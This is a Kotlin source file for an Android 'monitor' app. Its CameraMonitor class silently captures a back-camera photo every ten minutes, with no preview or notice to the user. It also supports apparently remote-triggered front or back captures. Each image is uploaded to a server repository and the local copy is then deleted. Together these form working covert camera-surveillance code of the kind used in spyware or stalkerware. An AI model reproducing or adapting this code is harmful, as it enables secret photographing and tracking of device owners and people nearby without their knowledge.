package com.empresa.monitor.service.monitoring

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import androidx.core.content.ContextCompat
import com.empresa.monitor.data.repository.MonitorRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.util.UUID
import javax.inject.Inject
import javax.inject.Singleton
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

@Singleton
class CameraMonitor @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitorRepository
) {
    private var job: Job? = null
    private val cameraManager by lazy {
        context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    }

    fun start(ctx: Context) {
        job = CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            while (isActive) {
                delay(600_000)
                capturePhoto("back")
            }
        }
    }

    suspend fun capturePhoto(cameraType: String, captureId: String? = null) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) return

        val cameraId = selectCamera(cameraType) ?: return
        val thread = HandlerThread("CameraCapture-${UUID.randomUUID()}").also { it.start() }
        val handler = Handler(thread.looper)

        try {
            val file = captureWithCamera2(cameraId, handler)
            if (file != null) {
                repository.uploadCameraImageFile(file, cameraType, captureId)
                file.delete()
            }
        } finally {
            thread.quitSafely()
        }
    }

    private suspend fun captureWithCamera2(cameraId: String, handler: Handler): File? =
        suspendCancellableCoroutine { cont ->
            val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    val file = File(context.cacheDir, "cam_${UUID.randomUUID()}.jpg")
                    FileOutputStream(file).use { it.write(bytes) }
                    cont.resume(file)
                } catch (e: Exception) {
                    cont.resume(null)
                } finally {
                    image.close()
                    reader.close()
                }
            }, handler)

            try {
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            val surface = imageReader.surface
                            val captureRequest = camera.createCaptureRequest(
                                CameraDevice.TEMPLATE_STILL_CAPTURE
                            ).apply {
                                addTarget(surface)
                                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                set(CaptureRequest.JPEG_QUALITY, 75)
                            }.build()

                            camera.createCaptureSession(
                                listOf(surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        try {
                                            session.capture(captureRequest, object : CameraCaptureSession.CaptureCallback() {
                                                override fun onCaptureFailed(
                                                    session: CameraCaptureSession,
                                                    request: CaptureRequest,
                                                    failure: CaptureFailure
                                                ) {
                                                    camera.close()
                                                    cont.resume(null)
                                                }
                                            }, handler)
                                        } catch (e: Exception) {
                                            camera.close()
                                            cont.resume(null)
                                        }
                                    }

                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        camera.close()
                                        cont.resume(null)
                                    }
                                },
                                handler
                            )
                        } catch (e: Exception) {
                            camera.close()
                            cont.resume(null)
                        }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        if (cont.isActive) cont.resume(null)
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        if (cont.isActive) cont.resume(null)
                    }
                }, handler)
            } catch (e: Exception) {
                imageReader.close()
                cont.resume(null)
            }

            cont.invokeOnCancellation { imageReader.close() }
        }

    private fun selectCamera(cameraType: String): String? {
        return try {
            val facing = if (cameraType == "front")
                CameraCharacteristics.LENS_FACING_FRONT
            else
                CameraCharacteristics.LENS_FACING_BACK

            cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == facing
            } ?: cameraManager.cameraIdList.firstOrNull()
        } catch (_: Exception) { null }
    }

    fun getCameraIds(): List<String> = try {
        cameraManager.cameraIdList.toList()
    } catch (_: Exception) { emptyList() }

    fun stop() {
        job?.cancel()
        job = null
    }
}
